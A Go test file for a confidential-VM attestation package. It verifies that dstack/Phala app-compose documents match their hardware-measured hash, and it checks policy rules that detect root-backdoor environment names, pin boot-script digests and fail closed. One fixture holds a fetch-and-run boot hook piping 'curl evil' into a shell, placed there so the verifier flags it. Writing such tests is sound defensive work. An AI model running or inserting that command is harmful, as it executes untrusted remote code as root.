/*
 * Copyright (c) 2026. TxnLab Inc.
 * SPDX-License-Identifier: Apache-2.0
 */

package attest

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"os"
	"slices"
	"sort"
	"strings"
	"testing"
)

// The same live Phala tdx.small capture the replay tests use, so the
// app-compose document and the quote that measured it come from ONE CVM.
// Splitting them across captures would let both halves pass while
// describing different machines.
const infoPath = "../../testdata/attest/ds_info.json"

// loadAppCompose recovers the measured document from the guest agent's
// /Info response.
//
// tcb_info is DOUBLY embedded — a JSON string whose contents are JSON —
// so this unmarshals twice. The inner app_compose is likewise a string,
// and it is that string's exact bytes that dstack hashed. Re-marshalling
// anywhere in here would reorder keys and hash a document dstack never
// saw.
func loadAppCompose(t *testing.T) string {
	t.Helper()
	raw, err := os.ReadFile(infoPath)
	if err != nil {
		t.Fatalf("read %s: %v", infoPath, err)
	}
	var info struct {
		TCBInfo json.RawMessage `json:"tcb_info"`
	}
	if err := json.Unmarshal(raw, &info); err != nil {
		t.Fatalf("parse %s: %v", infoPath, err)
	}
	// tcb_info arrives as a quoted string in this capture; accept an
	// object too, so a dstack release that stops double-encoding does not
	// silently skip every test below.
	inner := info.TCBInfo
	var asString string
	if err := json.Unmarshal(inner, &asString); err == nil {
		inner = json.RawMessage(asString)
	}
	var tcb struct {
		AppCompose string `json:"app_compose"`
	}
	if err := json.Unmarshal(inner, &tcb); err != nil {
		t.Fatalf("parse tcb_info: %v", err)
	}
	if tcb.AppCompose == "" {
		t.Fatal("capture carries no app_compose — every test below would " +
			"assert against an empty document that still hashes fine")
	}
	return tcb.AppCompose
}

// TestVerifyAppCompose_HashGateAgainstReplay is the anchor, and it
// deliberately pins NO constant.
//
// The measured hash comes out of VerifyEventLog — that is, out of a
// replay already checked byte-for-byte against the RTMR3 the hardware
// signed. So the chain this asserts is the real one: hardware quote ->
// replayed log -> compose-hash -> this document. Comparing against a
// hard-coded digest would only prove the code still agrees with itself,
// which is exactly how a wrong implementation looks verified.
func TestVerifyAppCompose_HashGateAgainstReplay(t *testing.T) {
	rawLog, quote := loadVectors(t)
	measurements, err := VerifyEventLog(rawLog, quote)
	if err != nil {
		t.Fatalf("VerifyEventLog: %v", err)
	}
	if measurements[EventComposeHash] == "" {
		t.Fatal("replay recovered no compose-hash, so the gate below is vacuous")
	}

	// The GATE alone. Policy is deliberately not exercised here: the
	// captured CVM really does carry a root back door, so a policy run
	// would fail for a reason that says nothing about the hash chain.
	// TestCapturedDocument_CarriesTheRootBackdoor is where that lives.
	captured := loadAppCompose(t)
	if err := VerifyComposeHash(captured, measurements); err != nil {
		t.Fatalf("the captured document did not hash to its own quote's measurement: %v", err)
	}

	doc, err := VerifyAppCompose(captured, measurements, ComposePolicy{
		PreLaunchScriptDigests: PhalaPreLaunchDigests(),
		AllowedEnvNames:        []string{"DSTACK_AUTHORIZED_KEYS"}, // not enforced; see below
	})
	// The only violation left must be the back door, which no policy can
	// permit. Anything else means a field rule is firing on a genuine
	// production document.
	var pe *ComposePolicyError
	if !errors.As(err, &pe) {
		t.Fatalf("want the capture's known back door to be the sole finding, got %v", err)
	}
	for _, v := range pe.Violations {
		if v.Code != ViolationRootBackdoorEnv {
			t.Errorf("unexpected violation on a real production document: %s", v)
		}
	}
	if doc == nil {
		t.Fatal("no document returned")
	}
	if doc.Runner != "docker-compose" || doc.ManifestVersion != 2 {
		t.Fatalf("parsed the wrong shape: runner=%q manifest=%d", doc.Runner, doc.ManifestVersion)
	}
	if strings.TrimSpace(doc.DockerCompose) == "" {
		t.Fatal("docker_compose_file came back empty, so the parse found nothing")
	}
}

// TestVerifyAppCompose_RefusesAnAlteredDocument is the other half of the
// anchor: the gate must reject a document that is not the measured one.
// A single flipped byte is the smallest edit an operator could make.
func TestVerifyAppCompose_RefusesAnAlteredDocument(t *testing.T) {
	rawLog, quote := loadVectors(t)
	measurements, err := VerifyEventLog(rawLog, quote)
	if err != nil {
		t.Fatalf("VerifyEventLog: %v", err)
	}
	doc := loadAppCompose(t)

	// Append one space. Semantically identical JSON, different bytes —
	// which is the point: dstack hashes the TEXT, so an implementation
	// that normalized or re-marshalled before hashing would accept this.
	if _, err := VerifyAppCompose(doc+" ", measurements, ComposePolicy{}); !errors.Is(err, ErrComposeHashMismatch) {
		t.Fatalf("a byte-altered document was accepted: err=%v", err)
	}
}

// TestVerifyAppCompose_AbsenceIsNotASkip covers the two ways this check
// can be turned off by omission rather than by attack. Both must fail,
// and both must fail with their OWN sentinel — an operator seeing
// "mismatch" when the real problem is "your node published nothing" is
// sent to debug the wrong thing.
func TestVerifyAppCompose_AbsenceIsNotASkip(t *testing.T) {
	real := loadAppCompose(t)
	sum := sha256.Sum256([]byte(real))
	good := map[string]string{EventComposeHash: hex.EncodeToString(sum[:])}

	if _, err := VerifyAppCompose("", good, ComposePolicy{}); !errors.Is(err, ErrNoAppCompose) {
		t.Fatalf("an empty document was not refused on its own terms: %v", err)
	}
	// An empty log map is the shape a node gets by simply not emitting the
	// event. It must not read as "nothing to check against, carry on".
	if _, err := VerifyAppCompose(real, map[string]string{}, ComposePolicy{}); !errors.Is(err, ErrNoComposeHash) {
		t.Fatalf("a missing compose-hash was not refused: %v", err)
	}
	if _, err := VerifyAppCompose("", map[string]string{}, ComposePolicy{}); err == nil {
		t.Fatal("empty document AND empty measurements verified successfully")
	}
}

// sealed makes a synthetic document pass the hash gate, so the tests
// below are about POLICY and fail for policy reasons only.
func sealed(doc string) map[string]string {
	sum := sha256.Sum256([]byte(doc))
	return map[string]string{EventComposeHash: hex.EncodeToString(sum[:])}
}

// sealedOn is sealed plus an os-image-hash, for the exemption tests.
//
// A root-backdoor concession is honoured only on an image named in
// ComposePolicy.RootBackdoorSafeOSImages, so a fixture that exercises the
// concession has to carry the image too. sealed() is deliberately left without
// one: it is now the fixture proving the gate fails CLOSED, which is what
// TestRootBackdoorExemption_NeedsAKnownSafeImage asserts.
func sealedOn(doc, osImage string) map[string]string {
	m := sealed(doc)
	m[EventOSImageHash] = osImage
	return m
}

// safeImage is an image the scan cleared — see attest.OSImagesWithoutSSHDaemon.
func safeImage() string { return OSImagesWithoutSSHDaemon()[0] }

// TestCapturedDocument_CarriesTheRootBackdoor is the detector's only
// POSITIVE fixture, and that is why it is worth a test of its own.
//
// The capture predates `--no-dev-os`, so its allowed_envs really does
// name DSTACK_AUTHORIZED_KEYS — `phala deploy` appended the deploying
// machine's ~/.ssh/id_ed25519.pub without a prompt. A detector exercised
// only on clean input agrees exactly with one that never fires.
func TestCapturedDocument_CarriesTheRootBackdoor(t *testing.T) {
	doc := loadAppCompose(t)
	_, err := VerifyAppCompose(doc, sealed(doc), ComposePolicy{})

	var pe *ComposePolicyError
	if !errors.As(err, &pe) {
		t.Fatalf("the backdoored capture verified clean: %v", err)
	}
	var found *Violation
	for i := range pe.Violations {
		if pe.Violations[i].Code == ViolationRootBackdoorEnv {
			found = &pe.Violations[i]
		}
	}
	if found == nil {
		t.Fatalf("no root-backdoor violation among %v", pe.Violations)
	}
	if !strings.Contains(found.Detail, "DSTACK_AUTHORIZED_KEYS") {
		t.Fatalf("the violation does not name the offending variable: %q", found.Detail)
	}
}

// TestRootBackdoor_FiresRegardlessOfTheEnvAllowlist. The backdoor names
// are not merely "unrecognized" — an operator who widened
// AllowedEnvNames, for any reason, must not thereby be able to permit a
// root credential. So the two rules are independent, and this is the
// test that holds them apart.
func TestRootBackdoor_FiresRegardlessOfTheEnvAllowlist(t *testing.T) {
	doc := `{"manifest_version":2,"runner":"docker-compose",` +
		`"docker_compose_file":"services: {}",` +
		`"allowed_envs":["DSTACK_AUTHORIZED_KEYS"]}`

	for _, p := range []ComposePolicy{
		{}, // no env rules at all
		{EnforceEnvAllowlist: true, AllowedEnvNames: []string{"DSTACK_AUTHORIZED_KEYS"}}, // explicitly permitted
	} {
		_, err := VerifyAppCompose(doc, sealed(doc), p)
		var pe *ComposePolicyError
		if !errors.As(err, &pe) || !hasCode(pe.Violations, ViolationRootBackdoorEnv) {
			t.Fatalf("policy %+v let a root credential through: %v", p, err)
		}
	}
}

// TestZeroSignalPolicy_ExemptsNoRootBackdoor is the pin that keeps the
// upstream carve-out out of our own nodes.
//
// AllowedRootBackdoorEnvs exists for ONE caller: a third-party attested
// upstream, whose compose we appraise but do not author. The obvious
// tidying-up is to wire it through to the policy that already knows about
// Phala — and that would silently let an operator exempt their own node from
// the check this package exists to run. Nothing else would go red.
func TestZeroSignalPolicy_ExemptsNoRootBackdoor(t *testing.T) {
	if got := ZeroSignalComposePolicy().AllowedRootBackdoorEnvs; len(got) != 0 {
		t.Fatalf("a ZeroSignal node's policy exempts root-backdoor envs %v — "+
			"that carve-out is only ever correct for a third-party upstream", got)
	}
}

// TestVerifyAppCompose_RefusesAnExemptingPolicy. The exemption must not be
// reachable through the entry point every node verifier uses, because that
// signature has nowhere to hand the exemption back — so an exemption taken
// there would be indistinguishable from a clean appraisal by the time it
// reached a payer.
//
// Refused as ViolationPolicyMisconfigured rather than ignored: a policy
// carrying reference data the call never consults is broken, not lenient.
// Same argument as EnforceComposeSkeleton's.
func TestVerifyAppCompose_RefusesAnExemptingPolicy(t *testing.T) {
	doc := loadAppCompose(t)
	p := ComposePolicy{AllowedRootBackdoorEnvs: []string{"DSTACK_AUTHORIZED_KEYS"}}

	_, err := VerifyAppCompose(doc, sealed(doc), p)
	var pe *ComposePolicyError
	if !errors.As(err, &pe) || !hasCode(pe.Violations, ViolationPolicyMisconfigured) {
		t.Fatalf("VerifyAppCompose honoured a root-backdoor exemption: %v", err)
	}
	// And it must refuse BEFORE appraising, so the caller cannot read the
	// result as "the document was fine".
	if hasCode(pe.Violations, ViolationRootBackdoorEnv) {
		t.Fatal("the misconfiguration was reported alongside an appraisal; " +
			"a refused policy must not also produce findings about the document")
	}
}

// TestVerifyUpstreamAppCompose_ReportsTheExemptionOnSuccess is the whole point
// of the second return value.
//
// Run against the real captured document, which genuinely names
// DSTACK_AUTHORIZED_KEYS. A synthetic document would agree with the code by
// construction.
func TestVerifyUpstreamAppCompose_ReportsTheExemptionOnSuccess(t *testing.T) {
	doc := loadAppCompose(t)
	p := ComposePolicy{
		AllowedRootBackdoorEnvs:  []string{"DSTACK_AUTHORIZED_KEYS"},
		RootBackdoorSafeOSImages: OSImagesWithoutSSHDaemon(),
		// The capture's own boot hook, so the only rule that can fire
		// here is the one under test. An empty digest list permits only
		// an EMPTY script — the strictest setting, not the absent one.
		PreLaunchScriptDigests: PhalaPreLaunchDigests(),
	}

	_, ex, err := VerifyUpstreamAppCompose(doc, sealedOn(doc, safeImage()), p)
	if err != nil {
		t.Fatalf("an exempted backdoor still failed the appraisal: %v", err)
	}
	if len(ex) != 1 || ex[0].Code != ViolationRootBackdoorEnv {
		t.Fatalf("the exemption was not reported: %v", ex)
	}
	if !strings.Contains(ex[0].Detail, "DSTACK_AUTHORIZED_KEYS") {
		t.Fatalf("the exemption does not name what was conceded: %q", ex[0].Detail)
	}
	// The detail has to say what the concession COSTS, not merely that one
	// was made. A caller renders this to an operator and, downstream, to a
	// payer; "exempted" alone reads as a formality.
	if !strings.Contains(ex[0].Detail, "does not mean") {
		t.Fatalf("the exemption does not state what it costs: %q", ex[0].Detail)
	}
	// The PUBLISHED form is a separate assertion because it has a separate
	// reader. SPEC § 3e pins `<rule>:<detail>` for carve_outs, and a payer's
	// verifier compares that token against its own expectation — so the one
	// thing Detail must NOT be is the string that goes on the wire.
	if got, want := ex[0].WireTag(), "root_backdoor_env:DSTACK_AUTHORIZED_KEYS"; got != want {
		t.Errorf("WireTag() = %q, want %q — this is the exact token SPEC § 3e "+
			"specifies and a verifier matches on", got, want)
	}
	if ex[0].WireTag() == ex[0].String() {
		t.Error("WireTag and String agree, so one of them is wrong: String carries " +
			"a sentence of operator prose and a verifier cannot match it")
	}
}

// TestExemption_WireTagUsesTheCanonicalName. A compose may spell a dstack env
// name in any case — the convention is uppercase, nothing enforces it — and the
// appraisal already folds case to decide. The PUBLISHED carve-out has to fold
// too, or a lowercase spelling publishes a token whose only defect is that no
// verifier's expectation matches it, which reads as a carve-out for something
// else entirely.
func TestExemption_WireTagUsesTheCanonicalName(t *testing.T) {
	doc := `{"manifest_version":2,"runner":"docker-compose",` +
		`"docker_compose_file":"services: {}",` +
		`"allowed_envs":[" dstack_root_password "]}`
	p := ComposePolicy{AllowedRootBackdoorEnvs: []string{"DSTACK_ROOT_PASSWORD"}, RootBackdoorSafeOSImages: OSImagesWithoutSSHDaemon()}

	_, ex, err := VerifyUpstreamAppCompose(doc, sealedOn(doc, safeImage()), p)
	if err != nil {
		t.Fatalf("the exempted name was not recognized as a backdoor: %v", err)
	}
	if len(ex) != 1 {
		t.Fatalf("exemptions = %v, want exactly one", ex)
	}
	if got, want := ex[0].WireTag(), "root_backdoor_env:DSTACK_ROOT_PASSWORD"; got != want {
		t.Errorf("WireTag() = %q, want %q", got, want)
	}
}

// TestExemption_TheEXEMPTINGNameIsFoldedToo is the other end of the same fold.
//
// The test above spells the sloppy name in the DOCUMENT, which is a third
// party's text. This one spells it in the POLICY, which comes from our own
// operator's config — the likelier place for a lowercase or padded value, and
// the end where the consequence is worse: the name then matches no backdoor, so
// the appraisal REFUSES instead of conceding, and the carve-out the payer is
// entitled to see never exists. Dropping either half of the fold leaves the
// other end's test green.
func TestExemption_TheEXEMPTINGNameIsFoldedToo(t *testing.T) {
	doc := `{"manifest_version":2,"runner":"docker-compose",` +
		`"docker_compose_file":"services: {}",` +
		`"allowed_envs":["DSTACK_ROOT_PASSWORD"]}`
	// Sloppy in the POLICY this time; the document is canonical.
	p := ComposePolicy{AllowedRootBackdoorEnvs: []string{" dstack_root_password "}, RootBackdoorSafeOSImages: OSImagesWithoutSSHDaemon()}

	_, ex, err := VerifyUpstreamAppCompose(doc, sealedOn(doc, safeImage()), p)
	if err != nil {
		t.Fatalf("a padded, lowercase carve-out did not match, so the appraisal refused "+
			"rather than conceding: %v", err)
	}
	if len(ex) != 1 || ex[0].Subject != "DSTACK_ROOT_PASSWORD" {
		t.Fatalf("exemptions = %v, want the conceded channel under its canonical name", ex)
	}
}

// TestVerifyUpstreamAppCompose_StillRefusesAnUnexemptedBackdoor. The upstream
// entry point relaxes exactly the names the policy lists and nothing else —
// otherwise it is not a carve-out, it is the check turned off.
func TestVerifyUpstreamAppCompose_StillRefusesAnUnexemptedBackdoor(t *testing.T) {
	doc := `{"manifest_version":2,"runner":"docker-compose",` +
		`"docker_compose_file":"services: {}",` +
		`"allowed_envs":["DSTACK_ROOT_PASSWORD"]}`
	// Exempts a DIFFERENT backdoor name than the one present. The safe-image
	// pair is not decoration: without it the image gate nils the concession
	// before the name comparison happens, and this test would pass for a
	// reason that has nothing to do with what it asserts.
	p := ComposePolicy{
		AllowedRootBackdoorEnvs:  []string{"DSTACK_AUTHORIZED_KEYS"},
		RootBackdoorSafeOSImages: OSImagesWithoutSSHDaemon(),
	}

	_, ex, err := VerifyUpstreamAppCompose(doc, sealedOn(doc, safeImage()), p)
	var pe *ComposePolicyError
	if !errors.As(err, &pe) || !hasCode(pe.Violations, ViolationRootBackdoorEnv) {
		t.Fatalf("an unexempted root credential was let through: %v", err)
	}
	// Empty here because the exempted name is not the one present — NOT
	// because a refusal suppresses exemptions. It does not: a document can
	// concede one rule and fail another, and both answers come back. Reading
	// this as the general rule is how a caller ends up treating the slice as a
	// "no violations" signal.
	if len(ex) != 0 {
		t.Fatalf("exempting an ABSENT name produced a concession: %v", ex)
	}
}

// TestVerifyUpstreamAppCompose_AConcessionAndAFailureCoexist.
//
// The two return values answer questions about DIFFERENT rules, so a refusal
// does not suppress the concessions and a concession does not soften the
// refusal. Pinned because the shape invites the wrong read in both directions:
// a caller that gates on `len(ex) > 0` publishes carve-outs for a document that
// failed appraisal, and one that assumes a refusal zeroes the slice writes a
// test whose passing says nothing.
func TestVerifyUpstreamAppCompose_AConcessionAndAFailureCoexist(t *testing.T) {
	doc := `{"manifest_version":2,"runner":"docker-compose",` +
		`"docker_compose_file":"services: {}",` +
		`"allowed_envs":["DSTACK_AUTHORIZED_KEYS","DSTACK_ROOT_PASSWORD"]}`
	// Exempts one of the two present backdoors.
	p := ComposePolicy{AllowedRootBackdoorEnvs: []string{"DSTACK_AUTHORIZED_KEYS"}, RootBackdoorSafeOSImages: OSImagesWithoutSSHDaemon()}

	_, ex, err := VerifyUpstreamAppCompose(doc, sealedOn(doc, safeImage()), p)
	var pe *ComposePolicyError
	if !errors.As(err, &pe) || !hasCode(pe.Violations, ViolationRootBackdoorEnv) {
		t.Fatalf("the unexempted root credential was let through: %v", err)
	}
	if len(pe.Violations) != 1 {
		t.Errorf("violations = %v, want only the unexempted name", pe.Violations)
	}
	if len(ex) != 1 || ex[0].Subject != "DSTACK_AUTHORIZED_KEYS" {
		t.Fatalf("exemptions = %v — the concession was lost because the same document "+
			"also failed a rule", ex)
	}
}

// TestExemption_OnlyForNamesThatAreActuallyBackdoors. A policy cannot
// manufacture a concession it never made. Listing an ordinary env name here
// must produce no exemption, because the exemption list is read downstream as
// the honest account of what was given up — padding it would make a weaker
// appraisal look more forthcoming than a stronger one.
func TestExemption_OnlyForNamesThatAreActuallyBackdoors(t *testing.T) {
	doc := `{"manifest_version":2,"runner":"docker-compose",` +
		`"docker_compose_file":"services: {}",` +
		`"allowed_envs":["HF_TOKEN"]}`
	// Safe image supplied so the concession is live: the point is that a
	// non-backdoor name earns nothing even when every precondition is met.
	p := ComposePolicy{
		AllowedRootBackdoorEnvs:  []string{"HF_TOKEN"},
		RootBackdoorSafeOSImages: OSImagesWithoutSSHDaemon(),
	}

	_, ex, err := VerifyUpstreamAppCompose(doc, sealedOn(doc, safeImage()), p)
	if err != nil {
		t.Fatalf("unexpected failure: %v", err)
	}
	if len(ex) != 0 {
		t.Fatalf("exempting a non-backdoor name invented a concession: %v", ex)
	}
}

// TestACIUpstreamPolicy_IsNotTheNodePolicy holds apart the two Phala
// pre-launch digest sets. Merging them would let a script blessed for a
// gateway satisfy the check on our own node, and both lists are Phala-injected
// so the temptation is real.
func TestACIUpstreamPolicy_IsNotTheNodePolicy(t *testing.T) {
	for _, d := range ACIUpstreamPreLaunchDigests() {
		if slices.Contains(PhalaPreLaunchDigests(), d) {
			t.Fatalf("digest %s is blessed for both a zs-node and a third-party "+
				"upstream; the two lists must not overlap", d)
		}
	}
	if ACIUpstreamComposePolicy(nil).EnforceComposeSkeleton {
		t.Fatal("the upstream policy enforces a zs-node compose skeleton, " +
			"which describes a document a gateway was never going to match")
	}
	// nil must give the strict policy — a caller that has not decided does
	// not get the concession.
	if got := ACIUpstreamComposePolicy(nil).AllowedRootBackdoorEnvs; len(got) != 0 {
		t.Fatalf("the default upstream policy already concedes %v", got)
	}
	// The digest list must BE the upstream one. The loop above proves the two
	// sets are disjoint, which stays true if this policy points at the wrong
	// one — and pointing at PhalaPreLaunchDigests is the single most available
	// wrong edit here, since the two calls sit one line apart in the
	// constructor and both names read as "Phala's boot hook".
	if got := ACIUpstreamComposePolicy(nil).PreLaunchScriptDigests; !slices.Equal(got, ACIUpstreamPreLaunchDigests()) {
		t.Fatalf("PreLaunchScriptDigests = %v, want ACIUpstreamPreLaunchDigests() %v — a "+
			"policy carrying the zs-node list refuses the real gateway's boot hook",
			got, ACIUpstreamPreLaunchDigests())
	}
}

// TestACIUpstreamPolicy_AppraisesAThirdPartyDocument runs the CONSTRUCTED policy
// against a document, which nothing in this module did.
//
// Every other test here appraises with an ad-hoc ComposePolicy literal, so the
// object production actually passes to VerifyUpstreamAppCompose was only ever
// field-read. The end-to-end appraisal of the real captured gateway lives in
// node/internal/upstreamattest (TestAppraise_RealGatewayVerifies) — and that is
// the problem this test exists for, not a reason to skip it: `proto` is its own
// git repo, so a release build or a CI job that clones it alone sees a green
// suite for a policy pinned nowhere in it.
//
// Synthetic rather than a copied fixture: duplicating the gateway capture into
// this repo would put a second copy of a 40 KB document on a different rotation
// schedule. What is asserted here is the two toggles a document can actually
// demonstrate; the digest list is covered by the identity assertion above.
func TestACIUpstreamPolicy_AppraisesAThirdPartyDocument(t *testing.T) {
	// A third party's env names are theirs. HF_TOKEN is not on any list of
	// ours, and no ZeroSignal policy would admit it.
	doc := `{"manifest_version":2,"runner":"docker-compose",` +
		`"docker_compose_file":"services: {}",` +
		`"features":["kms","tproxy-net"],` +
		`"kms_enabled":true,"local_key_provider_enabled":false,` +
		`"allowed_envs":["HF_TOKEN","DSTACK_AUTHORIZED_KEYS"]}`

	_, ex, err := VerifyUpstreamAppCompose(doc, sealedOn(doc, safeImage()),
		ACIUpstreamComposePolicy([]string{"DSTACK_AUTHORIZED_KEYS"}))
	if err != nil {
		t.Fatalf("the upstream policy refused an ordinary third-party document: %v\n"+
			"An env allowlist or a key-custody toggle inherited from our own node "+
			"policy refuses every upstream release, which reads as the gateway "+
			"having changed rather than as our policy being wrong.", err)
	}
	if len(ex) != 1 || ex[0].Subject != "DSTACK_AUTHORIZED_KEYS" {
		t.Fatalf("exemptions = %v, want the one conceded root-shell channel", ex)
	}
}

// TestEnvAllowlist_EmptyForbidsEverything is the fail-closed semantic.
//
// An empty list read as "no constraint" is the exact shape this package
// exists to refuse: it looks identical to the check working while
// permitting every name. Turning the check OFF has to be something a
// caller writes down (EnforceEnvAllowlist), never something they reach
// by leaving a list empty.
func TestEnvAllowlist_EmptyForbidsEverything(t *testing.T) {
	doc := `{"manifest_version":2,"runner":"docker-compose",` +
		`"docker_compose_file":"services: {}",` +
		`"allowed_envs":["NODE_LLM_OPENAI_API_KEY"]}`

	_, err := VerifyAppCompose(doc, sealed(doc), ComposePolicy{EnforceEnvAllowlist: true})
	var pe *ComposePolicyError
	if !errors.As(err, &pe) || !hasCode(pe.Violations, ViolationEnvNotAllowed) {
		t.Fatalf("an empty allowlist accepted a name: %v", err)
	}

	// ...and the same document with the name permitted must pass, or the
	// assertion above would also hold for a rule that rejects everything
	// unconditionally.
	ok := ComposePolicy{EnforceEnvAllowlist: true, AllowedEnvNames: []string{"node_llm_openai_api_key"}}
	if _, err := VerifyAppCompose(doc, sealed(doc), ok); err != nil {
		t.Fatalf("a permitted name (case-insensitively) was rejected: %v", err)
	}

	// Not enforcing means not enforcing — but see the backdoor test above
	// for the rule that still applies.
	if _, err := VerifyAppCompose(doc, sealed(doc), ComposePolicy{}); err != nil {
		t.Fatalf("membership was checked with EnforceEnvAllowlist false: %v", err)
	}
}

// TestUnknownTopLevelField_IsAViolation. A dstack release that adds a
// key — another boot hook, another key channel — must not ride through
// reporting clean just because no rule here mentions it.
func TestUnknownTopLevelField_IsAViolation(t *testing.T) {
	doc := `{"manifest_version":2,"runner":"docker-compose",` +
		`"docker_compose_file":"services: {}","some_new_boot_hook":"curl evil|sh"}`

	_, err := VerifyAppCompose(doc, sealed(doc), ComposePolicy{})
	var pe *ComposePolicyError
	if !errors.As(err, &pe) || !hasCode(pe.Violations, ViolationUnknownField) {
		t.Fatalf("an unmodelled field was ignored: %v", err)
	}
	// The whole point is naming it, so an operator does not have to diff
	// the document against this struct by hand.
	if !strings.Contains(pe.Error(), "some_new_boot_hook") {
		t.Fatalf("the violation does not name the field: %s", pe.Error())
	}
}

// TestPreLaunchScript_PinnedByDigest. The script is ~17 KB of bash that
// runs as root before the container starts. Measured only means "you can
// tell which one"; pinning is what makes that useful.
func TestPreLaunchScript_PinnedByDigest(t *testing.T) {
	captured := loadAppCompose(t)
	var doc AppCompose
	if err := json.Unmarshal([]byte(captured), &doc); err != nil {
		t.Fatalf("parse capture: %v", err)
	}
	if doc.PreLaunchScript == "" {
		t.Skip("capture carries no pre-launch script")
	}
	sum := sha256.Sum256([]byte(doc.PreLaunchScript))
	got := hex.EncodeToString(sum[:])

	// The capture's script is the known Phala CLI one, so the bundled
	// list must accept it. If this fails, the bundled digest is stale
	// rather than the capture being wrong.
	if !containsFold(PhalaPreLaunchDigests(), got) {
		t.Fatalf("the captured pre-launch script (%s) is not in PhalaPreLaunchDigests()", got)
	}

	pol := ComposePolicy{PreLaunchScriptDigests: PhalaPreLaunchDigests()}
	if _, err := VerifyAppCompose(captured, sealed(captured), pol); err != nil {
		var pe *ComposePolicyError
		if errors.As(err, &pe) && hasCode(pe.Violations, ViolationPreLaunchScript) {
			t.Fatalf("the blessed script was reported as unrecognized: %v", err)
		}
	}

	// One appended newline must be caught. The script is operator-editable
	// and measured, so the digest is the only thing standing between
	// "measured" and "trusted".
	//
	// Rebuilt through the marshaller rather than by splicing the raw text:
	// the script is JSON-ESCAPED inside the document, so the decoded string
	// does not appear there verbatim and a strings.Replace silently matches
	// nothing — leaving an "altered" document identical to the original and
	// a test that passes because it changed nothing.
	altered := mustMarshal(t, map[string]any{
		"manifest_version":    doc.ManifestVersion,
		"runner":              doc.Runner,
		"docker_compose_file": doc.DockerCompose,
		"pre_launch_script":   doc.PreLaunchScript + "\n",
	})
	_, err := VerifyAppCompose(altered, sealed(altered), pol)
	var pe *ComposePolicyError
	if !errors.As(err, &pe) || !hasCode(pe.Violations, ViolationPreLaunchScript) {
		t.Fatalf("an altered root boot hook was accepted: %v", err)
	}

	// ...and the same document with the ORIGINAL script must pass, or the
	// assertion above would also hold for a rule that rejects every script.
	same := mustMarshal(t, map[string]any{
		"manifest_version":    doc.ManifestVersion,
		"runner":              doc.Runner,
		"docker_compose_file": doc.DockerCompose,
		"pre_launch_script":   doc.PreLaunchScript,
	})
	if _, err := VerifyAppCompose(same, sealed(same), pol); err != nil {
		t.Fatalf("the blessed script was rejected when rebuilt: %v", err)
	}
}

// TestPreLaunchScript_EmptyListPermitsOnlyAnEmptyScript pins the
// deliberately inverted reading of an empty PreLaunchScriptDigests: it is
// the STRICTEST setting, not the absent one. Left as "no constraint" it
// would be the fail-open shape this package exists to refuse.
func TestPreLaunchScript_EmptyListPermitsOnlyAnEmptyScript(t *testing.T) {
	none := `{"manifest_version":2,"runner":"docker-compose",` +
		`"docker_compose_file":"services: {}","pre_launch_script":""}`
	if _, err := VerifyAppCompose(none, sealed(none), ComposePolicy{}); err != nil {
		t.Fatalf("an empty script was rejected: %v", err)
	}

	some := `{"manifest_version":2,"runner":"docker-compose",` +
		`"docker_compose_file":"services: {}","pre_launch_script":"echo hi"}`
	_, err := VerifyAppCompose(some, sealed(some), ComposePolicy{})
	var pe *ComposePolicyError
	if !errors.As(err, &pe) || !hasCode(pe.Violations, ViolationPreLaunchScript) {
		t.Fatalf("an empty digest list accepted a boot hook: %v", err)
	}
}

func mustMarshal(t *testing.T, v any) string {
	t.Helper()
	b, err := json.Marshal(v)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	return string(b)
}

// TestToggles_NilMeansUnchecked. A switch whose correct value is
// genuinely unsettled must stay visibly unpinned rather than be pinned
// to a guess — but a switch that IS pinned has to actually fire.
func TestToggles_NilMeansUnchecked(t *testing.T) {
	doc := `{"manifest_version":2,"runner":"docker-compose",` +
		`"docker_compose_file":"services: {}","public_logs":true}`

	if _, err := VerifyAppCompose(doc, sealed(doc), ComposePolicy{}); err != nil {
		t.Fatalf("an unpinned toggle was checked anyway: %v", err)
	}

	no := false
	pol := ComposePolicy{Toggles: ComposeToggles{PublicLogs: &no}}
	_, err := VerifyAppCompose(doc, sealed(doc), pol)
	var pe *ComposePolicyError
	if !errors.As(err, &pe) || !hasCode(pe.Violations, ViolationToggle) {
		t.Fatalf("a pinned toggle did not fire: %v", err)
	}

	yes := true
	okPol := ComposePolicy{Toggles: ComposeToggles{PublicLogs: &yes}}
	if _, err := VerifyAppCompose(doc, sealed(doc), okPol); err != nil {
		t.Fatalf("a toggle pinned to its actual value fired: %v", err)
	}
}

// TestEmptyDockerCompose_IsAViolation. A document with no compose
// measures nothing while producing a perfectly well-formed hash — the
// vacuous-measurement shape, and the one a hash allowlist cannot see.
func TestEmptyDockerCompose_IsAViolation(t *testing.T) {
	doc := `{"manifest_version":2,"runner":"docker-compose","docker_compose_file":"   "}`
	_, err := VerifyAppCompose(doc, sealed(doc), ComposePolicy{})
	var pe *ComposePolicyError
	if !errors.As(err, &pe) || !hasCode(pe.Violations, ViolationEmptyDockerCompose) {
		t.Fatalf("a document declaring no compose verified clean: %v", err)
	}
}

// TestManifestAndRunner_ZeroValuesDisableTheCheck, and non-zero values
// enforce it. Stated as a test because "0 disables" is exactly the kind
// of convention that turns into an accidental skip.
func TestManifestAndRunner_ZeroValuesDisableTheCheck(t *testing.T) {
	doc := `{"manifest_version":2,"runner":"docker-compose","docker_compose_file":"services: {}"}`
	if _, err := VerifyAppCompose(doc, sealed(doc), ComposePolicy{}); err != nil {
		t.Fatalf("zero-valued pins were enforced: %v", err)
	}

	_, err := VerifyAppCompose(doc, sealed(doc), ComposePolicy{ManifestVersion: 3, Runner: "podman"})
	var pe *ComposePolicyError
	if !errors.As(err, &pe) {
		t.Fatalf("mismatched pins did not fire: %v", err)
	}
	if !hasCode(pe.Violations, ViolationManifestVersion) || !hasCode(pe.Violations, ViolationRunner) {
		t.Fatalf("want both a manifest and a runner violation, got %v", pe.Violations)
	}
}

// TestPolicyError_StillReturnsTheDocument. A verifier that refuses needs
// to be able to say WHAT it refused, and re-parsing an untrusted
// document to build that message would re-open the gate this package
// closed.
func TestPolicyError_StillReturnsTheDocument(t *testing.T) {
	doc := `{"manifest_version":2,"runner":"docker-compose",` +
		`"docker_compose_file":"services: {}","allowed_envs":["DSTACK_ROOT_PASSWORD"]}`
	got, err := VerifyAppCompose(doc, sealed(doc), ComposePolicy{})
	if err == nil {
		t.Fatal("a root password env verified clean")
	}
	if got == nil {
		t.Fatal("no document returned alongside the policy error")
	}
	if got.Runner != "docker-compose" {
		t.Fatalf("the returned document is not the parsed one: %+v", got)
	}
}

